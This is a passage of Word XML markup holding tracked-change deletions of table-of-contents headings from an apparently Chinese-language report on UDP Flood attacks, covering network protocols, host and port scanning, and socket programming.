                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="613" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击相关网络协议</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>3</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="56FF510A" w14:textId="057CCE1D" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="614" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="615" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="616" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.1.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="617" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>ARP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="618" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>协议</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>3</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1BD4D35D" w14:textId="458E0B07" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="619" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="620" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="621" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.1.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="622" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>ICMP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="623" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>协议</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>4</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4EBD4B62" w14:textId="6D3894F7" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="624" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="625" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="626" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.1.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="627" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>IP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="628" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>协议</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>4</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4F01DC12" w14:textId="42C0FC68" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="629" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="630" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="631" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.1.4</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="632" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="633" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>协议</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>5</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="156486D8" w14:textId="7A501948" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="634" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="635" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="636" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="637" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="638" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击相关技术</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>6</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4C95B9F3" w14:textId="5DD92788" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="639" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="640" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="641" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.2.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="642" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>主机扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>6</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="270B82EF" w14:textId="6E93EBE2" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="643" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="644" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="645" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.2.2</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="646" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="647" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>端口扫描</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>7</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7FAAD4A0" w14:textId="12EECEAD" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="648" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="649" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="650" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.2.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="651" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>UDP Flood</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="652" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>攻击</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>8</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="57ABFB1B" w14:textId="59EF4379" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1050"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="480"/>
        <w:rPr>
          <w:del w:id="653" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="654" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="655" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.3</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="656" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>SOCKET</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="657" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>编程原理</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>9</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7BCD13BF" w14:textId="567EDBE8" w:rsidR="00AB422B" w:rsidDel="002C4A81" w:rsidRDefault="00AB422B">
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1680"/>
          <w:tab w:val="right" w:leader="dot" w:pos="8302"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="960"/>
        <w:rPr>
          <w:del w:id="658" w:author="yong li" w:date="2017-05-14T10:54:00Z"/>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:noProof/>
          <w:sz w:val="21"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="659" w:author="yong li" w:date="2017-05-14T10:54:00Z">
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="660" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>2.3.1</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:noProof/>
            <w:sz w:val="21"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="661" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>Socket</w:delText>
        </w:r>
        <w:r w:rsidRPr="00596B1B" w:rsidDel="002C4A81">
          <w:rPr>
            <w:rPrChange w:id="662" w:author="李勇" w:date="2017-05-13T21:43:00Z">
              <w:rPr>
                <w:rStyle w:val="a8"/>
                <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
                <w:b/>
                <w:noProof/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>的结构组成</w:delText>
        </w:r>
        <w:r w:rsidDel="002C4A81">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
          <w:delText>9</w:delText>
        </w:r>
      </w:del>
    </w:p>
